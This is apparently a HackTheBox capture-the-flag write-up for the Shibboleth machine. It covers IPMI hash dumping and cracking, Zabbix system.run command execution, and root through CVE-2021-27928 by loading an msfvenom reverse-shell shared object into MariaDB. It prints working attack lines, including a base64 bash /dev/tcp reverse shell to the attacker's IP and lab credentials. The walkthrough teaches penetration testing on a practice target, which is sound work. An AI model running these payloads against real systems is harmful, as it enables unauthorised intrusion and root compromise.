---
title: HTB: Shibboleth
url: https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html
date: 2022-04-02T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-shibboleth, hackthebox, nmap, vhosts, wfuzz, feroxbuster, zabbix, ipmi, msfconsole, msfvenom, shared-object, rakp, ipmipwner, hashcat, password-reuse, credentials, mysql, cve-2021-27928, youtube, htb-zipper, oscp-like-v2
---

![Shibboleth](https://0xdfimages.gitlab.io/img/shibboleth-cover.png)

Shibboleth starts with a static website and not much else. I’ll have to identify the clue to look into BMC automation and find IPMI listening on UDP. I’ll leak a hash from IPMI, and crack it to get creds to a Zabbix instance. Within Zabbix, I’ll have the agent run a command, providing a foothold. Some credential reuse pivots to the next user. To get root, I’ll exploit a CVE in MariaDB / MySQL. In Beyond Root, a video reversing the shared object file I used in that root exploit, as well as generating my own in C.

## Box Info

| Name | [Shibboleth](https://hackthebox.com/machines/shibboleth)  [Shibboleth](https://hackthebox.com/machines/shibboleth) [Play on HackTheBox](https://hackthebox.com/machines/shibboleth) |
| --- | --- |
| Release Date | [13 Nov 2021](https://twitter.com/hackthebox_eu/status/1509206330292285449) |
| Retire Date | 02 Apr 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Shibboleth |
| Radar Graph | Radar chart for Shibboleth |
| First Blood User | 00:46:03[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 01:15:19[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creators | [knightmare knightmare](https://app.hackthebox.com/users/8930)  [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` finds only a single open TCP port, HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.124
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 20:37 UTC
Nmap scan report for 10.10.11.124
Host is up (0.10s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.93 seconds
oxdf@hacky$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.124
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 20:42 UTC
Nmap scan report for 10.10.11.124
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds

```

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) version the host is likely running Ubuntu 20.04 focal.

### Subdomain Fuzz

`nmap` identified a redirect on port 80 to `shibboleth.htb`, which indicates that virtual host based routing is taking place. I’ll add that to my local `/etc/hosts` file, and I’ll use `wfuzz` to look for subdomains. I’ll start the scan and immediately kill it, noting that the pages are all returning 302 with 26 words:

```

oxdf@hacky$ wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   302        9 L      26 W     290 Ch      "www"
000000004:   302        9 L      26 W     296 Ch      "localhost"
000000002:   302        9 L      26 W     291 Ch      "mail"
000000003:   302        9 L      26 W     290 Ch      "ftp"
000000005:   302        9 L      26 W     294 Ch      "webmail"
000000006:   302        9 L      26 W     291 Ch      "smtp"
000000011:   302        9 L      26 W     290 Ch      "ns1"
000000012:   302        9 L      26 W     290 Ch      "ns2"
000000013:   302        9 L      26 W     299 Ch      "autodiscover"
000000014:   302        9 L      26 W     297 Ch      "autoconfig"
000000015:   302        9 L      26 W     289 Ch      "ns"
000000016:   302        9 L      26 W     291 Ch      "test"
000000022:   302        9 L      26 W     291 Ch      "pop3"
000000017:   302        9 L      26 W     288 Ch      "m"
000000020:   302        9 L      26 W     291 Ch      "www2"
000000021:   302        9 L      26 W     290 Ch      "ns3"
000000018:   302        9 L      26 W     291 Ch      "blog"
^C
Finishing pending requests...

```

I’ll add `--hw 26` to the end and re-run:

```

oxdf@hacky$ wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000099:   200        29 L     219 W    3687 Ch     "monitor"
000000346:   200        29 L     219 W    3687 Ch     "monitoring"
000000390:   200        29 L     219 W    3687 Ch     "zabbix"

Total time: 49.12391
Processed Requests: 4989
Filtered Requests: 4986
Requests/sec.: 101.5594

```

I’ll add each of those to `/etc/hosts` as well:

```
10.10.11.124 shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb

```

### shibboleth.htb - TCP 80

#### Site

The site is for a website design firm:

[![image-20220330210643070](https://0xdfimages.gitlab.io/img/image-20220330210643070.png)](https://0xdfimages.gitlab.io/img/image-20220330210643070.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220330210643070.png)

Almost all of the text is garbage text, and the links all lead to anchors throughout the page. There’s a contact form, but submitting to it returns an error:

![image-20220330211542781](https://0xdfimages.gitlab.io/img/image-20220330211542781.png)

At the very bottom of the page is a clue:

![image-20220330211059288](https://0xdfimages.gitlab.io/img/image-20220330211059288.png)

I’ve already seen a zabbix subdomain. “Bare Metal BMC automation” is worth looking further into.

#### Tech Stack

The links on the page lead to `index.html`, which is a static page, so no indication about any kind of framework. There’s nothing in the HTTP response headers except for the Apache that `nmap` noticed.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://shibboleth.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://shibboleth.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      317c http://shibboleth.htb/assets => http://shibboleth.htb/assets/
301      GET        9l       28w      316c http://shibboleth.htb/forms => http://shibboleth.htb/forms/
301      GET        9l       28w      321c http://shibboleth.htb/assets/img => http://shibboleth.htb/assets/img/
301      GET        9l       28w      320c http://shibboleth.htb/assets/js => http://shibboleth.htb/assets/js/
301      GET        9l       28w      321c http://shibboleth.htb/assets/css => http://shibboleth.htb/assets/css/
301      GET        9l       28w      329c http://shibboleth.htb/assets/img/clients => http://shibboleth.htb/assets/img/clients/
301      GET        9l       28w      324c http://shibboleth.htb/assets/vendor => http://shibboleth.htb/assets/vendor/
301      GET        9l       28w      331c http://shibboleth.htb/assets/img/portfolio => http://shibboleth.htb/assets/img/portfolio/
301      GET        9l       28w      334c http://shibboleth.htb/assets/img/testimonials => http://shibboleth.htb/assets/img/testimonials/
301      GET        9l       28w      326c http://shibboleth.htb/assets/img/team => http://shibboleth.htb/assets/img/team/
403      GET        9l       28w      279c http://shibboleth.htb/server-status
301      GET        9l       28w      328c http://shibboleth.htb/assets/vendor/aos => http://shibboleth.htb/assets/vendor/aos/
[####################] - 4m    359988/359988  0s      found:12      errors:10679  
[####################] - 3m     29999/29999   130/s   http://shibboleth.htb 
[####################] - 3m     29999/29999   134/s   http://shibboleth.htb/assets 
[####################] - 3m     29999/29999   139/s   http://shibboleth.htb/forms 
[####################] - 3m     29999/29999   133/s   http://shibboleth.htb/assets/img 
[####################] - 3m     29999/29999   130/s   http://shibboleth.htb/assets/js 
[####################] - 3m     29999/29999   125/s   http://shibboleth.htb/assets/css 
[####################] - 3m     29999/29999   126/s   http://shibboleth.htb/assets/img/clients 
[####################] - 3m     29999/29999   132/s   http://shibboleth.htb/assets/vendor 
[####################] - 3m     29999/29999   134/s   http://shibboleth.htb/assets/img/portfolio 
[####################] - 3m     29999/29999   130/s   http://shibboleth.htb/assets/img/testimonials 
[####################] - 3m     29999/29999   131/s   http://shibboleth.htb/assets/img/team 
[####################] - 2m     29999/29999   199/s   http://shibboleth.htb/assets/vendor/aos 

```

Nothing interesting.

### zabbix/monitor/monitoring.shibboleth.htb - TCP 80

All three of these subdomains return the same site, which is a login form for a Zabbix instance:

![image-20220330211820391](https://0xdfimages.gitlab.io/img/image-20220330211820391.png)

Zabbix is an enterprise monitoring application. I previously exploited it in [Zipper](/2019/02/23/htb-zipper.html), but there I could log in as guest, which isn’t an option here. Not much to do here without creds.

### IPMI

#### Background

Googling for the term “Bare Metal BMC automation” leads to a lot of references about IPMI, such as [this post](https://metal.equinix.com/blog/redfish-and-the-future-of-bare-metal-server-automation/).

> The most common platform is [IPMI](https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface). Currently in version 2.0, IPMI gives “out of band” access over ethernet to things like rebooting a server, measuring temperature or fan speed, or accessing an interface to a server such as IP-KVM or Serial-over-Lan.

The [HackTricks page on IPMI](https://book.hacktricks.xyz/pentesting/623-udp-ipmi) suggests it typically listens on UDP 623.

#### Scan

I’ll use `nmap` to scan and see if UDP 623 is open, and it is:

```

oxdf@hacky$ nmap -sU -p 623 -sCV -oA scans/nmap-udp623 shibboleth.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 21:27 UTC
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.096s latency).

PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.80%I=7%D=3/30%Time=6244CB38%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds

```

The scripts don’t give much information, but that port is definitely responding!

The HackTricks page also shows a MSF script to detect the version. I’ll give that a try:

```

msf6 > use  auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > options

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.10.11.124
rhosts => 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

It’s version 2.

## Shell as zabbix

### Get IPMI Hash

#### Background

IPMI 2 uses the RAKP protocol to exchange keys, and this has a huge security risk, first identified by Dan Farmer in [this post](http://fish2.com/ipmi/remote-pw-cracking.html):

> *The short version: the RAKP protocol in the IPMI specification allows anyone to use IPMI commands to grab a HMAC IPMI password hash that can be cracked offline. Longer explanation follows. Here’s a [little Perl program](http://fish2.com/ipmi/tools/rak-the-ripper.pl) that implements it.*

This [Rapid7 post](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/) sums it up:

> More recently, Dan Farmer identified an [even bigger issue](http://fish2.com/ipmi/remote-pw-cracking.html) with the IPMI 2.0 specification. In short, the authentication process for IPMI 2.0 mandates that the server send a salted SHA1 or MD5 hash of the requested user’s password to the client, prior to the client authenticating. You heard that right - the BMC will tell you the password hash for any valid user account you request. This password hash can broken using an offline bruteforce or dictionary attack. Since this issue is a key part of the IPMI specification, there is no easy path to fix the problem, short of isolating all BMCs into a separate network. The *ipmi\_dumphashes* module in the Metasploit Framework can make short work of most BMCs.

#### With MSF

Both the HackTricks post and the Rapid7 post mention a MSF module that can collect these hashes:

```

msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124
rhosts => 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                                 Required  Description
   ----                  ---------------                                                                 --------  -----------
   CRACK_COMMON          true                                                                            yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                                   no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                                      no        Save captured password hashes in john the ripper format
   PASS_FILE             /opt/metasploit-framework/embedded/framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                10.10.11.124                                                                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                                             yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                               yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                               yes       Delay between session retries in seconds
   THREADS               1                                                                               yes       The number of concurrent threads (max one per host)
   USER_FILE             /opt/metasploit-framework/embedded/framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

```

This script will take a list of users (default list is one called `ipmi_users.txt`) and ask for hashes for each of them. That list is actually quite short:

```

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > cat /opt/metasploit-framework/embedded/framework/data/wordlists/ipmi_users.txt
[*] exec: cat /opt/metasploit-framework/embedded/framework/data/wordlists/ipmi_users.txt

ADMIN
admin
root
Administrator
USERID
guest
Admin

```

I could try asking for other names if I wanted to as well, but I’ll start with the recommended list.

It returns one hash:

```

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:bfa382dc840500003332ec77155a87c439e4e063befc86ee45c6a9549950eceba32da628f637a746a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f4b2dcc03c98373e2ebe667693aa6a88651ffebb
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

#### With ipmiPwner

[ipmiPwner](https://github.com/c0rnf13ld/ipmiPwner) is a Python script that can do similar attacks. I’ll clone the repo, and then run `requirements.sh` to get my system prepped.

By default it will try the same list as MSF:

![image-20220331100028573](https://0xdfimages.gitlab.io/img/image-20220331100028573.png)

Running it with only the `--host [ip]` argument returns the hash for Administrator:

```

oxdf@hacky$ sudo python3 ipmipwner.py --host 10.10.11.124
[*] Checking if port 623 for host 10.10.11.124 is active
[*] Using the list of users that the script has by default
[*] Brute Forcing
[*] Number of retries: 2
[!] Wrong username ADMIN
[!] Wrong username admin
[*] The username: Administrator is valid
[*] The hash for user: Administrator
   \_ $rakp$a4a3a2a0820a0000f793de846396a33033290affdcb188a1b6db9aaa178ce75290b2fd6cfd76bac7a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$ac4f0b33225a3d1d4c5b7e423c094ef72bc4997d

```

The hash format is a bit different, and doesn’t match anything `hashcat` knows of. Still, but removing the leading `$rakp$` and replacing the other `$` with `:` generates the same format as MSF. Because this isn’t really a hash, but a challenge and response, it makes sense that the hash for the same user can change based on how it’s collected.

### Crack IPMI Hash

The hash above can be taken as that entire line and passed to `hashcat` (using the `--user` flag because the hash starts with the username), which will detect the format as mode 7300 and crack the hash very quickly:

```

$ /opt/hashcat-6.2.5/hashcat.bin ipmi.hash /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.5) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:
                                                    
7300 | IPMI2 RAKP HMAC-SHA1 | Network Protocol
...[snip]...
bfa382dc840500003332ec77155a87c439e4e063befc86ee45c6a9549950eceba32da628f637a746a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f4b2dcc03c98373e2ebe667693aa6a88651ffebb:ilovepumkinpie1
...[snip]...

```

### Zabbix

#### Authenticated

The password doesn’t work for any known users over SSH, so I’ll turn to Zabbix. Administrator/ilovepumkinpie1 works to log in (username is case sensitive), which lands me at the Zabbix dashboard:

[![image-20220331062238014](https://0xdfimages.gitlab.io/img/image-20220331062238014.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331062238014.png)

Under Monitoring –> Hosts it shows one host, shibboleth.htb:

[![image-20220331063422318](https://0xdfimages.gitlab.io/img/image-20220331063422318.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331063422318.png)

Clicking on the host gives a menu:

![image-20220331063445469](https://0xdfimages.gitlab.io/img/image-20220331063445469.png)

Clicking configuration leads to the configuration page for this host (could also go Configuration –> Hosts –> shibboleth.htb or several other paths).

[![image-20220331063546327](https://0xdfimages.gitlab.io/img/image-20220331063546327.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331063546327.png)

#### Execution via Host Item

In the top menu, under Items, it shows the various things that Zabbix is collecting from this host:

[![image-20220331063725041](https://0xdfimages.gitlab.io/img/image-20220331063725041.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331063725041.png)

At the top right, clicking “Create item” will open a form for a new item:

[![image-20220331063835525](https://0xdfimages.gitlab.io/img/image-20220331063835525.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331063835525.png)

I’ll set the name to something arbitrary. For the Key, I’ll use `system.run[]` to run the stuff inside `[]` in a shell. I’ll try a simple `id`:

[![image-20220331064837385](https://0xdfimages.gitlab.io/img/image-20220331064837385.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331064837385.png)

At the bottom of the form there are three buttons:

![image-20220331064855568](https://0xdfimages.gitlab.io/img/image-20220331064855568.png)

Rather than “Add”, which will set this running periodically and be loud as far bad OPSEC, I’ll use “Test”, which will run it once as a test without saving it. Clicking pops another box:

[![image-20220331065003525](https://0xdfimages.gitlab.io/img/image-20220331065003525.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331065003525.png)

Clicking “Get value” populates the “Value” field with the result of the script, in this case, the output of the `id` command:

[![image-20220331065049219](https://0xdfimages.gitlab.io/img/image-20220331065049219.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331065049219.png)

That’s execution!

### Reverse Shell

#### Initial Connection

I’ll first try a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), but it just returns a value of 1 and doesn’t make a connection. I suspect having the redirects passing through Zabbix is causing an issue. To eliminate special character issues, I’ll base64 encode the command:

```

oxdf@hacky$ echo "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 " | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

I’ve added a couple extra spaces in to get rid of any `+/=` characters.

I’ll set the Key to:

```

system.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash]

```

When I click “Get value”, there’s a connection and a at my `nc` listener:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.124 39694
bash: cannot set terminal process group (101294): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$

```

The website hangs waiting:

![image-20220331073528651](https://0xdfimages.gitlab.io/img/image-20220331073528651.png)

After about 5 seconds, the website shows an error:

![image-20220331073551485](https://0xdfimages.gitlab.io/img/image-20220331073551485.png)

And the shell dies:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.124 39812
bash: cannot set terminal process group (101454): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ exit
oxdf@hacky$

```

Interestingly, I didn’t type `exit`. That came from Zabbix.

#### Stabilize

I had this same issue on [Zipper](/2019/02/23/htb-zipper.html#stable-shell). There, I solved it by having my listener set up to issue commands back that generated a new shell in a new Perl process. I did test that, and it works here, but it’s unnecessary.

On the [Zabbix Agent documentation page](https://www.zabbix.com/documentation/5.0/en/manual/config/items/itemtypes/zabbix_agent), the section for `system.run` gives some detail of how it works:

[![image-20220331080244452](https://0xdfimages.gitlab.io/img/image-20220331080244452.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220331080244452.png)

It takes a command and an optional `wait` or `nowait`. With `nowait`, it returns 1 and doesn’t wait for execution to finish.

I’ll update my Key to:

```

system.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash, nowait]

```

On pushing “Get value” the value immediately updates to 1, and the shell connects, and doesn’t die.

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.124 43058
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$

```

I’ll upgrade it using the standard `script` trick:

```

zabbix@shibboleth:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
zabbix@shibboleth:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
zabbix@shibboleth:/$

```

## Shell as ipmi-svc

There’s a single home directory on Shibboleth:

```

zabbix@shibboleth:/home$ ls
ipmi-svc

```

It contains `user.txt`, but I zabbix can’t access it:

```

zabbix@shibboleth:/home/ipmi-svc$ cat user.txt 
cat: user.txt: Permission denied

```

Checking for password reuse, the “ilovepumkinpie1” password works for ipmi-svc:

```

zabbix@shibboleth:/home/ipmi-svc$ su - ipmi-svc
Password: 
ipmi-svc@shibboleth:~$ 

```

And I can grab `user.txt`:

```

ipmi-svc@shibboleth:~$ cat user.txt
d21ead8d************************

```

## Shell as root

### Enumeration

#### General

I don’t find too much else of interest on the file system. The web directory is for the most part HTML files. There’s no sign of a DB connection or any credentials. There’s a `contact.php` script that could take SMTP creds, but it’s not configured:

```

  // Uncomment below code if you want to use SMTP to send emails. You need to enter your correct SMTP credentials
  /*
  $contact->smtp = array(
    'host' => 'example.com',
    'username' => 'example',
    'password' => 'pass',
    'port' => '587'
  );
  */

```

Looking at the `netstat`, there’s nothing unexpected there either:

```

ipmi-svc@shibboleth:~$ netstat -tnl 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:10050           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp6       0      0 :::10050                :::*                    LISTEN     
tcp6       0      0 :::10051                :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN  

```

10050 and 10051 are [Zabbix-related](https://www.zabbix.com/forum/zabbix-help/47241-zabbix-agent-and-server-ports). 80 is the web stuff. 3306 is MySQL, which also [supports Zabbix](https://www.zabbix.com/documentation/current/en/manual/appendix/install/db_scripts).

#### MySQL

To find the creds for MySQL, I’ll need the Zabbix configuration file. It lives in `/etc/zabbix`, and it’s large, with most the lines being comments and default values. To find the DB creds, I’ll use two `grep` commands, first to remove lines that start with `#`, and then to remove empty lines:

```

ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf | grep -v "^#" | grep . 
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1

```

The user is zabbix and the password is “bloooarskybluh”.

With the creds, I’m able to connect to MySQL:

```

ipmi-svc@shibboleth:/etc/zabbix$ mysql -u zabbix -pbloooarskybluh
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 6153
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>

```

The only interesting DB is zabbix:

```

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| zabbix             |
+--------------------+
2 rows in set (0.001 sec)

```

It has a lot of tables, but nothing seems interesting there.

### CVE-2021-27928

#### Identify

On connecting to MySQL/MariaDB, the version string is printed. Googling for “10.3.25 MariaDB exploit”, there’s a lot of links about CVE-2021-27928:

![image-20220331083231127](https://0xdfimages.gitlab.io/img/image-20220331083231127.png)

This CVE was big in the news just before Shibboleth came out. The [top link](https://github.com/Al1ex/CVE-2021-27928) from Al1ex and Diefunction has a nice summary:

> Exploit Title: MariaDB 10.2 /MySQL - ‘wsrep\_provider’ OS Command Execution
> Date: 03/18/2021
> Exploit Author: Central InfoSec
> Version:
> MariaDB 10.2 before 10.2.37
> 10.3 before 10.3.28
> 10.4 before 10.4.18
> 10.5 before 10.5.9
> Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL
> Tested on: Linux
> CVE : CVE-2021-27928

Shibboleth’s version (10.3.25) should be vulnerable according to that.

#### Build Payload

To exploit this CVE, I’ll need a shared object (Linux’s version of a DLL), which I can create with `msfvenom`:

```

oxdf@hacky$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f elf-so -o rev.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: rev.so

```

I’ll move this to Shibboleth by starting a Python webserver (`python3 -m http.server 80`) on my VM in the folder with `rev.so` and then requesting it with `wget`:

```

ipmi-svc@shibboleth:/dev/shm$ wget 10.10.14.6/rev.so
--2022-03-31 13:40:35--  http://10.10.14.6/rev.so
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘rev.so’

rev.so                                                 100%[========================================================>]     476  --.-KB/s    in 0.001s  

2022-03-31 13:40:35 (509 KB/s) - ‘rev.so’ saved [476/476]

```

#### Execute

Now I just run the command in `mysql` to load the so which executes it:

```

MariaDB [(none)]> SET GLOBAL wsrep_provider="/dev/shm/rev.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query

```

At my host, there’s a connection:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.124 48960

```

It’s raw, there’s no prompt, but I can run commands:

```

id
uid=0(root) gid=0(root) groups=0(root)

```

Shell upgrade makes it nicer:

```

script /dev/null -c bash
Script started, file is /dev/null
root@shibboleth:/var/lib/mysql# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@shibboleth:/var/lib/mysql#

```

And I can grab `root.txt`:

```

root@shibboleth:/root# cat root.txt
ec7a9f03************************

```

## Beyond Root - SOs

For the MySQL exploit, I generated a ELF shared object using `msfvenom` that ran a reverse shell. I wanted to know a bit more about how all that worked. [This video](https://www.youtube.com/watch?v=zk1xmUj9rZA) addresses three questions:
- What’s going on in the `msfvenom` generated payload?
- How would I write and compile my own ELF shared object?
- What would what shared object look like in Ghidra?